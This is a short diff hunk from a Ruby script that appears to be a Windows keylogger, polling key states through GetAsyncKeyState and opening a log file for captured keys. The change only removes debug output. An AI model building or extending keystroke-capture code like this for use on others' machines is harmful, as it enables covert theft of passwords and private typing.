@@ -32,9 +32,5 @@ uppercase['\\'] = '|'
 # create a listener for Windows key-presses
 listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')
 
-puts keys
-puts "\n\n"
-puts uppercase
-
 logs = File.open('C://kpkt.txt', 'a')
 logs.close()
